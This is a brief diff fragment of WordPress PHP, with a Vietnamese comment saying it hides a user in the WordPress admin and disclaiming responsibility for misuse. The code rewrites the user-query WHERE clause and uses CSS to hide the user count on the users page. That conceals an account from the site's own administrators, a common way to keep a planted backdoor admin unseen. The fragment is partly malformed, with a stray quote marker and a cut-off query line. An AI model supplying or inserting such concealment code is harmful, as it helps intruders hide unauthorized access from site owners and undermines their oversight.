@@ -15,3 +15,5 @@ $user_search->query_where = str_replace('WHERE 1=1',
 }
 
 > function hide_useR_count(){ ?> <style> .wp-admin.users-php span.count {display:none;} </style> <?php } add_action('admin_head','hide_user_count');
+
+- Đây là dòng code ẩn user trong admin wordpress, tôi không khuyến khích bạn làm trang wordpress của người khác. Tôi sẽ không chịu trách nhiệm nào việc bạn sử dụng mục đích không chính đáng.
